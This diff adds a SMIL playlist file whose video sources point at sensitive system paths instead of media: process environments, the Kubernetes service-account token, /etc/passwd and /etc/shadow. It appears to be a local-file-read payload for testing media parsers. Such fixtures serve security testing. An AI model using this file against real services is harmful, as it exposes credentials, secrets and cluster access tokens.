@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="utf-8"?>
+<smil>
+  <body>
+    <switch>
+      <video src="/proc/1/exe"/>
+      <video src="/proc/self/exe"/>
+      <video src="/etc"/>
+      <video src="/proc/1/stat"/>
+      <video src="/proc/self/stat"/>
+      <video src="/proc/1/environ"/>
+      <video src="/proc/1/cmdline"/>
+      <video src="/var/run/secrets/kubernetes.io/serviceaccount/token"/>
+      <video src="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"/>
+      <video src="/var/run/secrets/kubernetes.io/serviceaccount/namespace"/>
+      <video src="/etc/passwd"/>
+      <video src="/etc/shadow"/>
+    </switch>
+  </body>
+</smil>
